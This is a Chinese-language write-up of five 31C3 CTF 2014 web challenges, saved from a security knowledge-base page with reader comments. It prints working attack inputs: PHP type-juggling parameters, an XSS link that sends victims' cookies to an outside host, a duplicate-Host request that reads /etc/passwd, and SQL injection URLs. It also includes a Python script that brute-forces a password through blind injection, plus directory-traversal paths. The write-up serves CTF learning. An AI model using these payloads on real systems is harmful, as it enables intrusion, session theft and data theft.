@@ -1,0 +1,165 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">31C3 CTF web关writeup</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">∑-TEAM</a> <span class="bull">·</span> <time title="2015/01/07 9:47" ui-time="" datetime="2015/01/07 9:47" class="published ng-binding ng-isolate-scope">2015/01/07 9:47</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 背景</h1><hr><p>31c3 CTF 还是很人性化的，比赛结束了之后还可以玩。看题解做出了当时不会做的题目，写了一个writeup。</p><p>英文的题解可以看这里https://github.com/ctfs/write-ups/tree/master/31c3-ctf-2014/web</p><h1>0x01 pCRAPp</h1><hr><blockquote><p>PHP is nasty crappy sometimes, just pwn it http://188.40.18.69/</p></blockquote><p>这题需要好多php技巧组合起来。过关需要这样提交。</p><pre><code>http://188.40.18.69/pCRAPp.php?a={%22a1%22:%221337a%22,%22a2%22:[[1],1,2,3,0]}&amp;b=0001&amp;c[0]=0031c3&amp;c[1][]=1111&amp;d=%00 
+</code></pre><p><img alt="enter image description here" img-src="1552d63ffb5bab6584f296f3ab3a7c28b788abd5.jpg"></p><p>逐步分析一下每个知识点，其实很多技巧在http://drops.wooyun.org/tips/4483这篇文章有讲到。</p><p>这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。</p><pre><code>#!php
+is_numeric(@$a["a1"])?die("nope"):NULL;    
+if(@$a["a1"]){
+        ($a["a1"]&gt;1336)?$v1=1:NULL;    
+}
+</code></pre><p>这里也利用了相同的原理，array_search 会使用'ctf'和array中的每个值作比较，而且intval('ctf')==0.</p><pre><code>#!php
+if(is_array(@$a["a2"])){
+        if(count($a["a2"])!==5 OR !is_array($a["a2"][0])) die("nope");
+        $pos = array_search("ctf", $a["a2"]);
+        $pos===false?die("nope"):NULL;
+        foreach($a["a2"] as $key=&gt;$val){
+            $val==="ctf"?die("nope"):NULL;
+        }
+        $v2=1;
+    }
+</code></pre><p>这里用到了一个BUG，http://blog.51yip.com/php/934.html。 在windows下 1.1.1 这种构造也会报错。</p><pre><code>#!php
+if(preg_match("/^([0-9]+\.?[0-9]+)+$/",@$_GET['b'])){
+    $b=json_decode(@$_GET['b']);
+    if($var = $b === NULL){
+        ($var===true)?$v3=1:NULL;
+    }
+} 
+</code></pre><p>这里用到的技巧是，array和string进行strcmp比较的时候会返回一个null，%00可以截断eregi</p><pre><code>#!php
+$c=@$_GET['c'];
+$d=@$_GET['d'];
+if(@$c[1]){
+    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){
+        eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
+        strpos(($c[0].$d), "31c3")?$v4=1:NULL;
+    }
+}
+if($v1 &amp;&amp; $v2 &amp;&amp; $v3 &amp;&amp; $v4){
+    include "flag.php";
+    echo $flag;
+} 
+</code></pre><h1>0x02 Page Builder</h1><hr><blockquote><p>These guys have ripped off our designs and using them in their web pages builder! We’d Haxx them, don’t worry we’ll give you decent points for it</p></blockquote><p>这一题分为两步，第一步构造一个报错页面。报错页面中会显示的filename没有escape。</p><p>如下构造参数</p><pre><code>filename=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E.php&amp;title=aaa&amp;style=style1&amp;content=aaa 
+</code></pre><p>会形成一个反射性的XSS</p><pre><code>http://188.40.18.76/output/e53a4123da9c71138c0daa360b0d89ab05ced8b8/&lt;img src=x onerror=alert(1)&gt;.php
+</code></pre><p>我们可以构造一个偷cookie的连接</p><pre><code>http://188.40.18.76/output/e53a4123da9c71138c0daa360b0d89ab05ced8b8/&lt;svg onload=eval(document.location.hash.slice(1))&gt;.php#document.location='http://lanantest.sinaapp.com/?'+document.cookie
+</code></pre><p>第二步把这个XSS提交到，Contact Us，就可以偷到cookie了，可以看到Flag</p><h1>0x03 HTTP</h1><hr><blockquote><p>Check out our cool webserver. It is really fast because it is implemented in C. For security we use the versatility of Ruby.</p><p>Get the source at:</p><p>http.tar.bz2 Some example sites hosted with our webserver:</p><p>http://works.90.31c3ctf.aachen.ccc.de/works.html</p><p>http://31c3ctf.90.31c3ctf.aachen.ccc.de/announcements.html</p></blockquote><p>给出了一个简单的webserver，首先看一下源代码。</p><p>run.sh 中可以看到数据包先经过，fw.rb 再进入server_file.c 进行处理。</p><pre><code>#!bash
+exec socat "TCP-LISTEN:80,reuseaddr=1,fork" "EXEC:./fw.rb simple ./serve_file,su=nobody,nofork" 2&gt; &gt;(tee -a ../www.log)
+</code></pre><p>看到 server_file.c 中，会读取 host目录下的path文件，并返回，首先想到任意文件读取。</p><pre><code>#!c
+if (chdir(host) == -1) {
+        goto _404;
+}
+int fd= open(path, O_RDONLY);
+if (fd == -1) {
+    goto _404;
+}
+struct stat stat;
+if (fstat(fd, &amp;stat) == -1) {
+    goto _404;
+}
+const char *file= mmap(NULL, stat.st_size, PROT_READ, MAP_SHARED, fd, 0);
+if (file == NULL) {
+    goto _404;
+}
+close(fd); 
+</code></pre><p>但是直接这样发送请求会被fw.rb forbidden。</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3b4954544f7b505a5752">[email&#160;protected]</a>:~# curl http://works.90.31c3ctf.aachen.ccc.de/passwd -H 'Host: /etc/'
+Forbidden 
+</code></pre><p>再看一下fw.rb的逻辑会获取最后一次出现的Host</p><pre><code>#!ruby
+def parse_headers(line_reader)
+        line_reader.collect do |line|
+            [$1, $2] if line=~ /\A([^:]*): *(.*)\z/
+        end.compact.inject({}) { |h, x| h[x[0]]= x[1]; h }
+ end
+</code></pre><p>serve_file会获取第一次出现的Host</p><pre><code>#!c
+for (;;) {
+        if (!read_line(buffer, &amp;buf_size)) {
+            goto invalid;
+        }
+        if (*buffer == '\r') {
+            goto invalid;
+        }
+        if (strncmp(buffer, "Host: ", sizeof("Host: ")-1) == 0) {
+            break;
+        }
+        char *eol= strchr(buffer, '\r');
+        buf_size-= eol-buffer-2;
+        buffer= eol+2;
+} 
+</code></pre><p>这样我们就可以构造两个Host来绕过fw.rb了。</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3644595942765d575a5f">[email&#160;protected]</a>:~# curl http://works.90.31c3ctf.aachen.ccc.de/passwd -H 'Host: /etc/' -H 'Host:
+works.90.31c3ctf.aachen.ccc.de'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+syslog:x:100:103::/home/syslog:/bin/false
+messagebus:x:101:105::/var/run/dbus:/bin/false
+uuidd:x:102:107::/run/uuidd:/bin/false
+landscape:x:103:110::/var/lib/landscape:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+flag:x:1001:1001:31C3_b45fa9e4d5969e3c524bdcde15f84125:/home/flag:
+</code></pre><h1>0x04 5CHAN</h1><hr><pre><code>5CHAN? Never heard of this image board, but they have exactly what we need. The picture we’re looking
+for is not for public, so can you get it?
+
+http://188.40.18.89/
+</code></pre><p>首先访问一下http://188.40.18.89/robots.txt，会发现一个backup的目录，下载下来得到源码。</p><p>看下代码很容易发现一个sql注入漏洞，构造如下的语句，就可以的到Flag</p><pre><code>http://188.40.18.89/?page=pic&amp;id=9 union select * from pictures  where id=9 -- a
+</code></pre><p><img alt="enter image description here" img-src="23d1139d691872113dcfb7a89508a85e6fdfa180.jpg"></p><h1>0x05 Devilish</h1><hr><blockquote><p>It’s some devilish community public portal, we’re pretty sure there’s something else out there, a private portal maby, we’d like to know the secret behind it.</p><p>http://188.40.18.70/</p></blockquote><p>首先找到一个SQl注入当做突破口。</p><pre><code>http://188.40.18.70/PROFILE/54\/KiTTyKiTTy 
+</code></pre><p>在页面的注释里面可以找到具体执行的SQL语句</p><pre><code>&lt;!--SELECT * FROM users WHERE id_user='54\' AND Us3rN4m3='KiTTyKiTTy'--&gt; 
+</code></pre><p>注入点过滤了很多东西，经过尝试XML报错的方式是可以利用的。</p><pre><code>http://188.40.18.70/PROFILE/56\/-extractvalue(1,concat(0x5c,(select%09Us3rN4m3%09from%09users%09limit%091)))--%09 
+</code></pre><p>因为information_schema 被过滤了，我们需要用另外一种方式来猜出字段名</p><pre><code>http://188.40.18.70/PROFILE/54%5C/-%28select%09*%09from%09%28select%09*%09from%09users%09join%09users%09b%09using%28id_user,Us3rN4m3,Em4iL4dr3Szz,S4cR3dT3xT0Fm3,MyPh0N3NumB3RHAHA,Addr3Zz0F_tHi5_D3wD,CHAR_LOL%29%29c%29--%09
+</code></pre><p>执行可得知密码字段为P4sWW0rD&#95;0F&#95;M3_WTF，好变态 - -！</p><p>报错出密码，这里有一个比较坑的地方就是因为报错信息长度有限制的关系，这里并不会显示全部的密码。</p><pre><code>http://188.40.18.70/PROFILE/56\/-extractvalue(1,concat(0x5c,(select%09P4sWW0rD_0F_M3_WTF%09from%09users%09limit%091)))--%09
+</code></pre><p>我们可以使用locate暴力猜出剩余的密码。 写了一个比较渣的脚本</p><pre><code>#!python
+import requests
+import string 
+
+charset = string.ascii_letters + string.digits
+
+print charset
+
+if __name__=='__main__':
+    ipass = 'sd654egezjniufsdqc89q7d65azd123'
+    print ipass.encode('hex')
+    while True:
+        for i in charset:
+            t = ipass + i
+            r = requests.get('http://188.40.18.70/PROFILE/56\/-extractvalue(1,concat(0x5c,(select%09locate(0x'+t.encode('hex')+',P4sWW0rD_0F_M3_WTF)%09from%09users%09limit%091)))--%09')
+            if r.text.find('XPATH syntax error: \'\1\'')!=-1:
+                print 'Got it!'+i
+                ipass = t
+                print ipass
+            else:
+                print 'No!'+i 
+</code></pre><p>跑出完整的出密码</p><pre><code>Dracula / ZD456ddssd65456lksndoiNzd654sdsd654zd65s4d56489zdz 
+</code></pre><p>登陆之后又一个比较明显的文件遍历,可以看到网站还有一个隐藏的目录。</p><pre><code>http://188.40.18.70/ACCESS?action=browse&amp;dir=../../../../../var/www/html/__WebSiteFuckingPrivateContentNotForPublic666 
+</code></pre><p>访问里面的页面可以得到源码</p><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="384a57574c7853595451">[email&#160;protected]</a>:~# curl http://188.40.18.70/_&#95;WebSiteFuckingPrivateContentNotForPublic666/LOGIN&#95;HEAD</p><pre><code>#!php
+&lt;?php
+    if(@$_SESSION['user']){header("location: ".$LINK);die();}
+    if(isset($_POST['user'])){
+        if(mysqli_num_rows(mysqli_query($con,"SELECT * FROM users WHERE Us3rN4m3='".mysqli_real_escape_string($con,@$_POST['user'])."' AND P4sWW0rD_0F_M3_WTF='".mysqli_real_escape_string($con,@$_POST['pass'])."' "))&gt;0){
+            $_SESSION=$_POST;
+            header("location: ".$LINK);die();
+        }else{
+            $Error=1;
+        }
+    }
+?&gt; 
+</code></pre><p>但是Flag并不在里面，而是是藏在另外一个web服务之中。在这个目录下可以看到。</p><pre><code>http://188.40.18.70/ACCESS?action=browse&amp;dir=../../../../../../../home/devilish.local/__WebSiteFuckingPrivateContentNotForPublic666%2b666 
+</code></pre><p>这个server中的INDEX文件输出了Flag</p><pre><code>#!html
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ed9f828299ad868c8184">[email&#160;protected]</a>:~# curl "http://188.40.18.70/__WebSiteFuckingPrivateContentNotForPublic666%2b666/INDEX" -H "Host: devilish.local"
+&lt;br/&gt;
+        This is the private Portal of us&lt;br/&gt;&lt;br/&gt;
+        If you are accessing this page this means you are one of the very few exclusive members who are allowed to come in here!&lt;br/&gt; 
+
+&lt;br/&gt;
+&lt;?php echo($logged?"Here's your secret ".$flag."&lt;br/&gt;&lt;br/&gt;":"Login to access the secret&lt;br/&gt;&lt;br/&gt;")?&gt;
+
+&lt;span class="styleX"&gt;s&lt;/span&gt; 
+</code></pre><p>研究一下代码可以发现，这两个系统其实使用同一套session,我们可以先在默认的系统登录，这里要在POST数据里提交is&#95;ExclusiveMember=1，因为$&#95;SESSION=$_POST，会被同步到Session之中。</p><p><img alt="enter image description here" img-src="3ada39e3805cdba85ffc29e41f7992d54a84e148.jpg"></p><p>再去访问devilish.local,即可得到flag</p><p><img alt="enter image description here" img-src="6c2cadc0adbe204158006e3a28bd268090af0667.jpg"></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/1951" rel="bookmark" id="re1">渗透技巧之SSH篇</a></li><li><a href="http://drops.wooyun.org/papers/6035" rel="bookmark" id="re2">Oracle盲注结合XXE漏洞远程获取数据</a></li><li><a href="http://drops.wooyun.org/tips/8166" rel="bookmark" id="re3">使用exp进行SQL报错注入</a></li><li><a href="http://drops.wooyun.org/tips/7679" rel="bookmark" id="re4">php比较操作符的安全问题</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">3ky7in4</span> <span class="reply-time">2015-03-20 21:46:13</span></div><p></p><p>O(∩_∩)O分享，关于php方面，自己还有很多脑洞没开。期待下次的好文</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-01-14 14:04:28</span></div><p></p><p>又看了一片</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">laterain</span> <span class="reply-time">2015-01-10 11:52:18</span></div><p></p><p>在WinXP下做pCRAP拿b=1.1.1成功了，拿到题目上测试死活做不出来，原来是这里的问题，学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">太阳风</span> <span class="reply-time">2015-01-07 15:18:06</span></div><p></p><p>洗个麻。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我是壮丁</span> <span class="reply-time">2015-01-07 14:33:49</span></div><p></p><p>洗个麻。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">error</span> <span class="reply-time">2015-01-07 13:55:51</span></div><p></p><p>洗个麻。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Summer</span> <span class="reply-time">2015-01-07 13:54:37</span></div><p></p><p>洗个麻。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">′ 雨。</span> <span class="reply-time">2015-01-07 12:56:06</span></div><p></p><p>洗个麻。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">迦南</span> <span class="reply-time">2015-01-07 10:27:32</span></div><p></p><p>抢楼</p><p></p></div></div></div></div></div></main>
